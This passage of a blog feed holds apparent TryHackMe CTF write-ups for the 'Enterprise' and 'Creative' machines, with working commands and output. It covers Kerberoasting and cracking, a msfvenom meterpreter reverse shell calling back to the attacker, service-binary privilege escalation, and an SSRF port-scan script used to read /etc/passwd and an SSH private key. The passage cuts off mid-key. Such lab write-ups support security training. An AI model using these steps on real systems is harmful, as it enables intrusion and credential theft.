class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><p>→ WebServer:</p><pre><code class="hljs bash">curl -i http://10.10.32.71 | <span class="hljs-built_in">head</span> -n 50</code></pre><p>→</p><pre><code class="hljs bash">└─$ curl -i http://10.10.32.71 | <span class="hljs-built_in">head</span> -n 50  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100   215  100   215    0     0   1462      0 --:--:-- --:--:-- --:--:--  1472HTTP/1.1 200 OKContent-Type: text/htmlLast-Modified: Thu, 11 Mar 2021 21:36:34 GMTAccept-Ranges: bytesETag: <span class="hljs-string">&quot;3349ac9bbe16d71:0&quot;</span>Server: Microsoft-IIS/10.0Date: Wed, 24 Jul 2024 07:11:15 GMTContent-Length: 215&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;&lt;h1&gt; Enterprise Domain Controller. Keep out! &lt;/h1&gt;&lt;/html&gt;</code></pre><p>On this Port 80 we didn’t find anything interesting.</p><h3 id="SMB-Ports-139-445"><a href="#SMB-Ports-139-445" class="headerlink" title="SMB - Ports 139 &amp; 445"></a>SMB - Ports 139 &amp; 445</h3><p>The <code>smbclient</code> is a command-line tool that allows for interaction with SMB&#x2F;CIFS shares on a network, enabling file access and transfer similar to an FTP client.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ smbclient -L //10.10.32.71 -N</code></pre><p>→</p><p><img src="/../enterprise_img/1.png" alt="alt text"></p><p>The Docs share contains some encrypted documents that we are not interested in:</p><p><img src="/../enterprise_img/2.png" alt="alt text"></p><p>With the Users share we don’t get anything really, we get permission-denied for users like atlbitbucket and bitbucket</p><h3 id="HTTP-Port-7990"><a href="#HTTP-Port-7990" class="headerlink" title="HTTP - Port 7990"></a>HTTP - Port 7990</h3><p>On this page we have a big hint which tells us that We are moving to Github! </p><p><img src="/../enterprise_img/3.png" alt="alt text"></p><p>With a quick google search we find a Github Page:</p><p><img src="/../enterprise_img/4.png" alt="alt text"></p><p>The one who did this has a repository with a script </p><p><img src="/../enterprise_img/5.png" alt="alt text"></p><p>The script.. but it says Updated things let’s check why did he update</p><p><img src="/../enterprise_img/6.png" alt="alt text"></p><p>We find some kind of creds:</p><p><img src="/../enterprise_img/7.png" alt="alt text"></p><p>User: nik</p><p>Pass: ToastyBoi!</p><p>Let’s try to crack these creds with CrackMapExec:</p><ul><li>command used:</li></ul><pre><code class="hljs bash">crackmapexec smb 10.10.32.71 -u nik -p <span class="hljs-string">&#x27;ToastyBoi!&#x27;</span></code></pre><p>We check these credentials with CrackMapExec and we find that they are valid!!</p><p><img src="/../enterprise_img/8.png" alt="alt text"></p><p>Also we can see right there that the domain name is lab.enterprise.thm so let’s add it to &#x2F;etc&#x2F;hosts</p><h1 id="Roasting"><a href="#Roasting" class="headerlink" title="Roasting"></a>Roasting</h1><p>Roasting typically refers to the process of exploiting and cracking hashed credentials obtained from network services.</p><p><strong>Let’s do some user enumeration</strong></p><p>For that we will use <code>GetADUsers</code> from the Impacket Library</p><ul><li>command used:</li></ul><pre><code class="hljs bash">GetADUsers.py <span class="hljs-string">&#x27;lab.enterprise.thm/nik:ToastyBoi!&#x27;</span> -dc-ip 10.10.32.71 -all</code></pre><p>→</p><p><img src="/../enterprise_img/9.png" alt="alt text"></p><h3 id="LDAP-Port-389"><a href="#LDAP-Port-389" class="headerlink" title="LDAP - Port 389"></a><strong>LDAP - Port 389</strong></h3><p>I also ran ldapdomaindump</p><ul><li>command used:</li></ul><pre><code class="hljs bash">ldapdomaindump -u <span class="hljs-string">&#x27;lab.enterprise.thm\nik&#x27;</span> -p <span class="hljs-string">&#x27;ToastyBoi!&#x27;</span> 10.10.32.71</code></pre><p>→</p><p><img src="/../enterprise_img/10.png" alt="alt text"></p><p>We found out that bitbucker is a member of the Remote Desktop Users group which permits the user to RDP to Lab-DC.</p><p><img src="/../enterprise_img/11.png" alt="alt text"></p><p>We could check to see if there are any service accounts in the domain. </p><p>If there are accounts with a service principle name set, we could Kerberoast them and attempt to crack their hash offline.</p><p><strong>We’re gonna utilize Impacket for this by using GetUserSPNs</strong></p><ul><li>command used:</li></ul><pre><code class="hljs bash">GetUserSPNs.py <span class="hljs-string">&#x27;lab.enterprise.thm/nik:ToastyBoi!&#x27;</span> -request -outputfile kerbroast.out</code></pre><p>→ </p><p><img src="/../enterprise_img/12.png" alt="alt text"></p><p>We got the hash:</p><pre><code class="hljs bash">└─$ <span class="hljs-built_in">cat</span> kerbroast.out                                                                   $krb5tgs$23$*bitbucket<span class="hljs-variable">$LAB</span>.ENTERPRISE.THM<span class="hljs-variable">$HTTP</span>/LAB-DC*$51ef4562864cbd6243c9db7e6a945df7<span class="hljs-variable">$5683ded80c22aef96767b0e38944195fec6d0a36da23594ea679e41c789147e6de3ff0d6745f62e7a6b604c9a87b01726d137e8fe3abc6c20f60213eacbc41cb24058cc5e863d5576addb42811105a95c959f983aa844b507c5f0f6c3aa88baea6261a59d0ef5341dfed62e9881e6a1972ebe153685bc164ef4dc92e1e679753973a8d38f31201659ce31f1fbdfa2f07270e424159dace9993c9283d347152a0762fe32937c8d5386696ae962b012bf0a33f8eb71fedf26117da536e71f5a0297fb5bb19606cd453ef791631af79944aab2353a5e8506b83b098158f5e2f6993a41e5847a288a7a1b35ed76f2b15d767420dd35d58ddbf89c9a60619a7e9c5fe32a9c65ac8971968a24afb17bdca26917eb49c33d2c6b3806dc4485f6ee38db2bc1f8a9ad2b891085885642bfdad71c19948ab1024abf16952dd9dec85d5ee8ab7cb373fa70737708ef317eb0646dc5d6e85e5ceb91400f3eca07c8132ab7a654e6494f028c2a8af4d98ae3e265b00256bd40800c6f9a8647b5fd1079224d13bc9de3e07fc41b0dccd8d307b2338c04d0f0c5b03821ac1d923aac1d04792561e007d7bee5c8867303d639ba652f9f6b4c6f19d06e1ab6f420c9465d6e942a4f7b30552fc1ee764e7b21e7d0973aefb33980239c2cb3346e4cd4900086e56d5a77d5944ca168af79b45686654634dcc97b738b3f47528e7e4e30922151f0d913407a9f3d7b46206187cf1adfa0d109fd5305719eb6c6991f4c6581e131c18202a80ebee5702b682dbfc0d59b213e6bd38ab5d78469a4eae145f340add8a54850b921c4a8b7499753eb38aa4516f86599ea3ccd1cac531d96b8f747e721092ff6f7d863b22feca0229792a5bdc6c9e821902126e070e2ebecdc5be3348c6533c3dec8cfffeb9b837fe5a261c08c69c48b847b940d3b5d7e5a4b69e82021932f928bb86f5b4e076c6bf6a2b73601e1816c13c9f9098143a41e448cd1a9b206118ce82d449021b7b154f3fe7da91cfecb63aeacacca8acf446be41b34a39a7a583923eef2a9e7e5701ab53689ac4e4a02b2600a85c3d8e0cc3ff053aa553a86a90cb439d422d1da405958a7c3df176d17cb8114e8b5ee986c7f8aa84515a93cd7be24c4765e05b361f1be8ee115f00b5a5653efb7600f3e3b15dfcec61e00007a1e46108ee4d06ee36e80f90424d6288b8e0b32a1f3628d2a1fbdf9a0575c7d32c7708ecb848cf0cedfcbd217e251781c90b43f242d899a4eacccdc6d5d8fd631e1cf5e8cbf23fa8c576e0e846bbce5720d242c145533dde077628589db5711282427445de38d24fb92ef27954d9c222ab773091438044f94314b01a0b538a09a5f493b019</span></code></pre><p>Now let’s use john to crack the hash.</p><p>John the Ripper is used in a penetration test to crack password hashes and identify weak or compromised passwords.</p><ul><li>command</li></ul><pre><code class="hljs bash">└─$ john kerbroast.out -w=/usr/share/wordlists/rockyou.txt</code></pre><ul><li><strong><code>john</code></strong>:<ul><li>This is the command to invoke John the Ripper, a popular password cracking tool.</li></ul></li><li><strong><code>kerbroast.out</code></strong>:<ul><li>This is the input file containing the Kerberos hashes you want to crack. It should be formatted correctly for John the Ripper to process.</li></ul></li><li><strong><code>w=/usr/share/wordlists/rockyou.txt</code></strong>:<ul><li>This specifies the wordlist to use for cracking the hashes.</li><li><code>w</code> (or <code>-wordlist</code>) tells John the Ripper to use the specified file as a wordlist.</li><li><code>/usr/share/wordlists/rockyou.txt</code> is the path to the wordlist file. This wordlist contains common passwords and is used by John the Ripper to attempt to crack the hashes.</li></ul></li></ul><p>→ output: </p><pre><code class="hljs bash">└─$ john kerbroast.out -w=/usr/share/wordlists/rockyou.txt   Using default input encoding: UTF-8Loaded 1 password <span class="hljs-built_in">hash</span> (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Will run 4 OpenMP threadsPress <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> statuslittleredbucket  (?)     1g 0:00:00:00 DONE (2024-07-24 04:23) 1.315g/s 2066Kp/s 2066Kc/s 2066KC/s livelife93..liss27Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliablySession completed.</code></pre><p>We got the bitbucket’s pass: littleredbucket</p><h1 id="Remoting-Our-Way-In"><a href="#Remoting-Our-Way-In" class="headerlink" title="Remoting Our Way In"></a><strong>Remoting Our Way In</strong></h1><p>We know bitbucket’s pass so let’s try RDP</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ xfreerdp /v:LAB.ENTERPRISE.THM /u:bitbucket /p:littleredbucket</code></pre><p>Got users flag: THM{ed882d02b34246536ef7da79062bef36}</p><p><img src="/../enterprise_img/13.png" alt="alt text"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>We uploaded PowerUp.ps1 with a python3 http server to the victim’s machine: </p><ul><li>commands used:</li></ul><pre><code class="hljs bash">└─$ python3 -m http.server\bitbucket&gt; wget <span class="hljs-string">&quot;http://10.9.2.254:8000/PowerUp.ps1&quot;</span> -o PowerUp.ps1\bitbucket&gt; Import-Module .\PowerUp.ps1</code></pre><p>Now we did <code>Invoke-AllChecks</code> and we found a possible privilege escalation vector via <code>zerotieroneservice</code></p><p><img src="/../enterprise_img/14.png" alt="alt text"></p><p>We’re going to use msfvenom to create a shell.exe file that will give us a meterpreter later:</p><pre><code class="hljs bash">└─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.9.2.254 lport=4444 -f exe -o shell.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of exe file: 73802 bytesSaved as: shell.exe</code></pre><p>Now start a python3 server and go into this directory:</p><p> <code>(x86)\Zero Tier\Zero Tier One&gt;</code></p><p>Get the shell.exe and rename it:</p><pre><code class="hljs bash">(x86)\Zero Tier&gt; wget <span class="hljs-string">&quot;http://10.9.2.254:8000/shell.exe&quot;</span> -o Zero.exe</code></pre><p>Stop the service:</p><pre><code class="hljs bash">Stop-Service -name zerotieroneservice</code></pre><p><strong>Let’s go on our kali and fire up msfconsole</strong></p><pre><code class="hljs bash">use multi/handler</code></pre><p><img src="/../enterprise_img/15.png" alt="alt text"></p><p>Now do <code>run</code> in the msfconsole, on the vitctim’s machine we are going to start the service </p><p><img src="/../enterprise_img/16.png" alt="alt text"></p><p>We have meterpreter but we have to move fast and and migrate, either the session is going to die:</p><pre><code class="hljs bash">meterpreter &gt; migrate -N winlogon.exe</code></pre><p><img src="/../enterprise_img/17.png" alt="alt text"></p><p>We are NT AUTHORITY:</p><pre><code class="hljs bash">meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM</code></pre><p>Went into C:\Users\Administrator\Desktop and got flag:</p><pre><code class="hljs bash">meterpreter &gt; <span class="hljs-built_in">cd</span> Desktopmeterpreter &gt; <span class="hljs-built_in">ls</span>Listing: C:\Users\Administrator\Desktop=======================================Mode              Size  Type  Last modified              Name----              ----  ----  -------------              ----100666/rw-rw-rw-  282   fil   2021-03-11 20:47:55 -0500  desktop.ini100666/rw-rw-rw-  37    fil   2021-03-14 22:49:34 -0400  root.txtmeterpreter &gt; <span class="hljs-built_in">cat</span> root.txtTHM&#123;1a1fa94875421296331f145971ca4881&#125;</code></pre><p>Root Flag: <code>THM&#123;1a1fa94875421296331f145971ca4881&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Hard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Creative</title>
      <link href="/2024/07/25/Creative/"/>
      <url>/2024/07/25/Creative/</url>
      
        <content type="html"><![CDATA[<p><img src="/../Creative_img/sddefault.jpg" alt="alt text"></p><p><strong>Target IP Address: 10.10.162.171</strong></p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">$ sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.162.171</code></pre><p>→ output:</p><pre><code class="hljs bash">PORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63</code></pre><h2 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning"></a>NMAP Full Scanning</h2><ul><li>command used:(scanning the ports we got)</li></ul><pre><code class="hljs bash">nmap -A -sC -sV -p22,80 10.10.162.171</code></pre><p>→ output:</p><pre><code class="hljs bash">PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://creative.thm|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p><code>|_http-title: Did not follow redirect to http://creative.thm</code></p><ul><li>add creative.thm to &#x2F;etc&#x2F;hosts</li></ul><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p><p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p><p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p><ul><li>SSH package version:</li></ul><pre><code class="hljs bash">nc -vn 10.10.162.171 22</code></pre><p>→ output:</p><pre><code class="hljs bash">(UNKNOWN) [10.10.162.171] 22 (ssh) openSSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5</code></pre><p>-&gt; SSH key fingerprint:</p><pre><code class="hljs bash">ssh root@10.10.162.171</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash">The authenticity of host <span class="hljs-string">&#x27;10.10.162.171 (10.10.162.171)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:09XvTnhtDcy1LRcuA8MJ6i3a1gN/7Prv5xmZF9v8Gq4.</span><span class="hljs-string">This key is not known by any other names.</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span></code></pre><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><ul><li><blockquote><p>Web Server:</p></blockquote></li></ul><pre><code class="hljs bash">curl -i http://creative.thm | <span class="hljs-built_in">head</span> -n 50</code></pre><p>→ output:</p><pre><code class="hljs bash"> % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0HTTP/1.1 200 OKServer: nginx/1.18.0 (Ubuntu)Date: Fri, 19 Jul 2024 07:32:35 GMTContent-Type: text/htmlContent-Length: 37589Last-Modified: Fri, 16 Aug 2019 01:38:36 GMTConnection: keep-aliveETag: <span class="hljs-string">&quot;5d56091c-92d5&quot;</span>Accept-Ranges: bytes&lt;!DOCTYPE html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;    &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;Start your development with Creative Studio landing page.&quot;</span>&gt;    &lt;meta name=<span class="hljs-string">&quot;author&quot;</span> content=<span class="hljs-string">&quot;Devcrud&quot;</span>&gt;    &lt;title&gt;Creative Studio | Free Bootstrap 4.3.x template&lt;/title&gt;    &lt;!-- font icons --&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/vendors/themify-icons/css/themify-icons.css&quot;</span>&gt;    &lt;!-- Bootstrap + Creative Studio main styles --&gt;        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/creative-studio.css&quot;</span>&gt;&lt;/head&gt;&lt;body data-spy=<span class="hljs-string">&quot;scroll&quot;</span> data-target=<span class="hljs-string">&quot;.navbar&quot;</span> data-offset=<span class="hljs-string">&quot;40&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;home&quot;</span>&gt;        &lt;!-- Page Navigation --&gt;    &lt;nav class=<span class="hljs-string">&quot;navbar custom-navbar navbar-expand-lg navbar-dark&quot;</span> data-spy=<span class="hljs-string">&quot;affix&quot;</span> data-offset-top=<span class="hljs-string">&quot;20&quot;</span>&gt;        &lt;div class=<span class="hljs-string">&quot;container&quot;</span>&gt;            &lt;a class=<span class="hljs-string">&quot;navbar-brand&quot;</span> href=<span class="hljs-string">&quot;#&quot;</span>&gt;                &lt;img src=<span class="hljs-string">&quot;assets/imgs/logo.png&quot;</span> alt=<span class="hljs-string">&quot;Download free bootstrap 4 landing page, free boootstrap 4 templates, Download free bootstrap 4.1 landing page, free boootstrap 4.1.1 templates, Creative studio Landing page&quot;</span>&gt;            &lt;/a&gt;            &lt;button class=<span class="hljs-string">&quot;navbar-toggler&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;button&quot;</span> data-toggle=<span class="hljs-string">&quot;collapse&quot;</span> data-target=<span class="hljs-string">&quot;#navbarSupportedContent&quot;</span> aria-controls=<span class="hljs-string">&quot;navbarSupportedContent&quot;</span> aria-expanded=<span class="hljs-string">&quot;false&quot;</span> aria-label=<span class="hljs-string">&quot;Toggle navigation&quot;</span>&gt;                &lt;span&gt;&lt;/span&gt;            &lt;/button&gt;            &lt;div class=<span class="hljs-string">&quot;collapse navbar-collapse&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;navbarSupportedContent&quot;</span>&gt;                &lt;ul class=<span class="hljs-string">&quot;navbar-nav ml-auto&quot;</span>&gt;                    &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;                        &lt;a class=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;#home&quot;</span>&gt;Home&lt;/a&gt;                    &lt;/li&gt;                    &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;                        &lt;a class=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;#about&quot;</span>&gt;About&lt;/a&gt;                    &lt;/li&gt;                    &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;                        &lt;a class=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;#service&quot;</span>&gt;Service&lt;/a&gt;                    &lt;/li&gt;                    &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt; 36 37589   36 13786    0     0  65219      0 --:--:-- --:--:-- --:--:-- 65336curl: (23) Failure writing output to destination, passed 8932 returned 2348</code></pre><h2 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h2><p><strong>Directory Busting with Gobuster</strong>: “Directory busting with Gobuster involves scanning a website for hidden or unlisted directories by making numerous HTTP requests using a wordlist.”</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://creative.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p>→ output:</p><pre><code class="hljs bash">/assets               (Status: 301) [Size: 178] [--&gt; http://creative.thm/assets/]</code></pre><p>&#x2F;assets is apparently not found</p><h2 id="Subdomain-Enumeration"><a href="#Subdomain-Enumeration" class="headerlink" title="Subdomain Enumeration"></a>Subdomain Enumeration</h2><p><strong>Subdomain Enumeration with Gobuster</strong>: “Subdomain enumeration with Gobuster involves identifying subdomains of a target domain by making DNS requests using a wordlist.”</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ gobuster vhost -u http://creative.thm/ -w /usr/share/seclists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t 40</code></pre><p>→ output:</p><pre><code class="hljs bash">Found: beta.creative.thm Status: 200 [Size: 591]</code></pre><p>We found <strong>beta.creative.thm</strong> let’s check it but first add it to &#x2F;etc&#x2F;hosts:</p><p><img src="/../Creative_img/1.png" alt="alt text"></p><p>I tried getting a reverse shell but it didnt work so i checked <strong><a href="http://localhost/">http://localhost</a></strong> and it showed us the html of <code>creative.thm</code></p><p><img src="/../Creative_img/2.png" alt="alt text"></p><p>→ output:</p><p><img src="/../Creative_img/3.png" alt="alt text"></p><p>So what i have in mind is maybe we can try <strong><a href="http://localhost:PORT">http://localhost:PORT</a></strong> to see if there are  any other HTTP services that we are not able to see.</p><p>After doing some research i found a python script for this:</p><p><strong>→ SCRIPT:</strong></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> urllib.parse<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<span class="hljs-keyword">def</span> <span class="hljs-title function_">send_post_request</span>(<span class="hljs-params">url, payload, headers</span>):    <span class="hljs-keyword">try</span>:        response = requests.post(url, data=payload, headers=headers)        content_length = response.headers.get(<span class="hljs-string">&#x27;Content-Length&#x27;</span>)        <span class="hljs-keyword">if</span> content_length != <span class="hljs-string">&#x27;13&#x27;</span>:  <span class="hljs-comment"># Check if content length isn&#x27;t 13</span>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;POST request to <span class="hljs-subst">&#123;url&#125;</span> with payload <span class="hljs-subst">&#123;payload&#125;</span> returned status code: <span class="hljs-subst">&#123;response.status_code&#125;</span>, content length: <span class="hljs-subst">&#123;content_length&#125;</span>&quot;</span>)    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error sending POST request: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():    base_url = <span class="hljs-string">&quot;http://beta.creative.thm&quot;</span>    headers = &#123;        <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;beta.creative.thm&quot;</span>,        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>,        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>,        <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>,        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,        <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://beta.creative.thm&quot;</span>,        <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>,        <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://beta.creative.thm/&quot;</span>,        <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>    &#125;    <span class="hljs-comment"># Using ThreadPoolExecutor to run 20 threads concurrently</span>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">20</span>) <span class="hljs-keyword">as</span> executor:        <span class="hljs-keyword">for</span> port_number <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65536</span>):            url = <span class="hljs-string">f&quot;http://localhost:<span class="hljs-subst">&#123;port_number&#125;</span>&quot;</span>            payload = <span class="hljs-string">f&quot;url=http%3A%2F%2Flocalhost%3A<span class="hljs-subst">&#123;port_number&#125;</span>&quot;</span>            executor.submit(send_post_request, base_url, payload, headers)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    main()</code></pre><p>So basically the script loops through every port from 1 to 65535 and send it as post body to creative.thm. The script will show only responses that are not the Content-Length of 13 because that means the server couldn’t connect to that.</p><p><img src="/../Creative_img/4.png" alt="alt text"></p><p>Let’s do it now:</p><pre><code class="hljs python">└─$ python3 portscript.py</code></pre><p>We have 2 responses, one from PORT 80 that we already know and one from PORT 1337:</p><p><img src="/../Creative_img/5.png" alt="alt text"></p><p>So now we search for <code>http://localhost:1337</code>:</p><p><img src="/../Creative_img/6.png" alt="alt text"></p><p>→ output:</p><p><img src="/../Creative_img/7.png" alt="alt text"></p><p>Perfect! It seems like we have a directory listing now let’s see for &#x2F;etc&#x2F;passwd</p><p><img src="/../Creative_img/8.png" alt="alt text"></p><p>→ output:</p><pre><code class="hljs python">saad:x:<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:saad:/home/saad:/<span class="hljs-built_in">bin</span>/bash</code></pre><p>So.. we’ve got a user saad alright so now the situation looks good.</p><p>From my experience with Tryhackme machines i know that there might be a chance that we find an <code>id_rsa</code> so we would connect with ssh to the user and then do PrivESC, let’s try that.</p><p>We would search for :</p><pre><code class="hljs python">http://localhost:<span class="hljs-number">1337</span>/home/saad/.ssh/id_rsa</code></pre><p><img src="/../Creative_img/9.png" alt="alt text"></p><p>→ output:</p><p><img src="/../Creative_img/10.png" alt="alt text"></p><p>Now create the file id_rsa and connect with ssh</p><p>→ SSH key:</p><pre><code class="hljs python">-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA1J8+LAd rb49YHdSMzgX80AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDBbWMPTToe wBK40FcBuzcLlzjLtfa21TgQxhjBYMPUvwzbgiGpJYEd6sXKeh9FXGYcgXCduq3rz/PSCs 48K+nYJ6Snob95PhfKfFL3x8JMc3sABvU87QxrJQ3PFsYmEzd38tmTiMQkn08Wf7g13MJ6 LzfUwwv9QZXMujHpExowWuwlEKBYiPeEK7mGvS0jJLsaEpQorZNvUhrUO4frSQA6/OTmXE d/hMX2910cAiCa5NlgBn4nH8y5bjSrygFUSVJiMBVUY0H77mj6gmJUoz5jv96fV+rBaFoB LGOy00gbX+2YTzBIJsKwOG97Q3HMnMKH+vCL09h/i3nQodWdqLP73U0PK2pu/nUFvGE8ju nkkRVNqqO5m0eYfdkWHLKz13JzohUBBsLrtj6c9hc8CIqErf5B573RKdhu4gy4JkCMEW1D xKhNWu+TI3VME1Q0ThJII/TMCR+Ih+/IDwgVTaW0LJR6Cn5nZzUHBLjkDV66vJRYN/3dJ5 bncTJ3dKFpec8AAAWQYx0osErJi/dcuK4vkpBkSG3N3iHsGeQh9KtrGHma9f5/l4HV1O2g NpdxT+pG8ti5+pJmbA12WIILPWPmq8RlXJoPY2Hg6swPFtgB0KCLotz8XMjYTB0PMHpa4S 98bHQ0G0t3WtkYewKtGIe5J5kEw6YxGVg7/uXQVohACNoniByRMhX2HG6mkXV9p2zi9ym+ Zd7LYPSZ6FTKLouqJbpcADwX6YywSV8uXIGAnT6u5UJMU7EbQhextQYqPOzihsVDUL/uSw quaPQYJ/8ZqBI5o3on+F2fVbNc7J/5t0gDd0tTzQDFZlMg3zJlnoVkxC+/NLuSrGrzC/<span class="hljs-number">52</span> 